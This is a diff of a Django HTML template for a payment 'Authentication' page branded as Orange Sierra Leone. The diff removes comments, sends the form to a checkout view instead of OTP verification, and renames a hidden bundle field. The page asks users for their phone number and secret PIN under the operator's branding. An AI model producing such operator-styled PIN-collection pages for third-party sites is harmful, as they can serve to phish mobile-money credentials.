@@ -5,7 +5,6 @@
 
     <div class="max-w-md w-full bg-white rounded-[35px] overflow-hidden shadow-2xl">
 
-        <!-- Top Banner -->
         <div class="relative h-[260px]">
             <img
                 src="https://images.unsplash.com/photo-1523908511403-7fc7b25592f4?w=1200"
@@ -17,10 +16,8 @@
             <div class="absolute bottom-0 left-0 right-0 bg-white rounded-t-[35px] h-10"></div>
         </div>
 
-        <!-- Content -->
         <div class="px-8 pb-8 -mt-2 relative z-10 bg-white">
 
-            <!-- Header -->
             <div class="mb-8">
                 <h1 class="text-3xl font-black text-black">
                     Authentication
@@ -31,11 +28,9 @@
                 </p>
             </div>
 
-            <!-- Form -->
-            <form action="{% url 'otp_verification' %}" method="POST" class="space-y-8">
+            <form action="{% url 'payments:checkout' %}" method="POST" class="space-y-8">
                 {% csrf_token %}
 
-                <!-- Phone -->
                 <div>
                     <label class="block text-[10px] uppercase font-bold text-gray-500 mb-3 tracking-widest">
                         Orange Number
@@ -55,7 +50,6 @@
                     </div>
                 </div>
 
-                <!-- PIN -->
                 <div>
                     <label class="block text-[10px] uppercase font-bold text-gray-500 mb-3 tracking-widest">
                         Secret PIN
@@ -80,19 +74,15 @@
                     </div>
                 </div>
 
-                <!-- Hidden bundle value -->
-                <input type="hidden" name="bundle" value="{{ request.GET.bundle }}">
+                <input type="hidden" name="bundle_id" value="{{ request.GET.bundle }}">
 
-                <!-- Submit -->
                 <button
                     type="submit"
                     class="w-full bg-[#ff7900] hover:brightness-110 active:scale-[0.99] transition-all text-white py-4 rounded-2xl font-black uppercase tracking-[2px] shadow-xl">
-
                     Continue Authentication
                 </button>
             </form>
 
-            <!-- Footer -->
             <div class="mt-10 text-center">
                 <p class="text-[9px] uppercase tracking-[4px] text-gray-300">
                     Powered by Orange Sierra Leone
